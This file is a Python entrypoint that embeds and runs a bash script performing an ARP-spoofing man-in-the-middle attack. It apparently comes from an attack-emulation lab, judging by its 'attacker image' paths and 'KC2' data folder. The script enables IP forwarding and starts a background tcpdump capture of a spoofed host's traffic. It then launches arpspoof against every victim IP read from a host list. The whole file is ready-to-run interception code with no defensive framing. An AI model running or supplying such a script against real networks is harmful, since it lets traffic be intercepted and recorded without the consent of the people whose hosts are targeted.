#!/usr/bin/env python3
"""Python entrypoint for arp-spoof.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

SPOOFED="${1:-${FRONTEND_PROXY_IP:-172.18.0.200}}"
INPUT_FILE="${2:-$DATA_PATH/KC2/iphost}"
TCPDUMP_OUT="${3:-$DATA_PATH/KC2/node_traffic}"
TCPDUMP_LOG="${4:-$DATA_PATH/KC2/tcpdump_stdout_err.log}"
NAME="${5:-${ARP_VICTIM:-proxy}}"
PIDFILE="${6:-$DATA_PATH/KC2/arp_pids}"

if [[ -z "${INPUT_FILE}" || ! -f "${INPUT_FILE}" ]]; then
  echo "No IP file" >&2
  exit 1
fi

# Installing dependencies
require_tools ip awk sort pgrep tcpdump arpspoof sysctl

# Extraction of all the IPs (first column of the file) - no duplications
mapfile -t VICTIMS < <(awk -F' - ' -v NAME="$NAME" '$2 ~ NAME { print $1 }' "$INPUT_FILE" | sort -u)
if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
  echo "No victim found (Host having $NAME in the name). Using all the network as victim" >&2
  mapfile -t VICTIMS < <(awk -F' - ' '{print $1}' "${INPUT_FILE}" | sort -u)
  if [[ "${#VICTIMS[@]}" -eq 0 ]]; then
    echo "ERROR: no worker found" >&2
    exit 1
  fi
fi

# Interface used to reach spoofed host
IFACE="$(ip -o route get "${SPOOFED}" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="dev") {print $(i+1); exit}}')"
IFACE="${IFACE:-eth0}"

echo "[*] Spoofed       : ${SPOOFED}"
echo "[*] Victims       : ${VICTIMS[*]}"
echo "[*] Interface     : ${IFACE}"

# Enabling IP forwarding to not interrupting the traffic
echo "[*] Enabling IPv4 forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

if pgrep -f "tcpdump .* ${SPOOFED}" >/dev/null 2>&1; then
  echo "[*] tcpdump already in execution for ${SPOOFED} (no actions)"
else
  echo "[*] Running tcpdump outside shell: ${TCPDUMP_OUT}"
  setsid tcpdump -i "${IFACE}" -n host "${SPOOFED}" -w "${TCPDUMP_OUT}" \
      >"${TCPDUMP_LOG}" 2>&1 < /dev/null &
  sleep 1
fi

# Run ARP spoof for all the victims
PIDS=()

echo "[*] Execution arpspoof to nodes for spoofed ${SPOOFED}"
for NODE in "${VICTIMS[@]}"; do
  echo "    - node ${NODE}"
  setsid arpspoof -i "${IFACE}" -t "${NODE}" "${SPOOFED}" >/dev/null 2>&1 < /dev/null &
  PIDS+=("$!")
done

for pid in "${PIDS[@]}"; do
  printf '%s\n' "$pid" >> "$PIDFILE"
done

echo
echo "[*] MITM on"
echo "    - pcap: ${TCPDUMP_OUT}"
echo "    - log tcpdump: ${TCPDUMP_LOG}"
echo
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
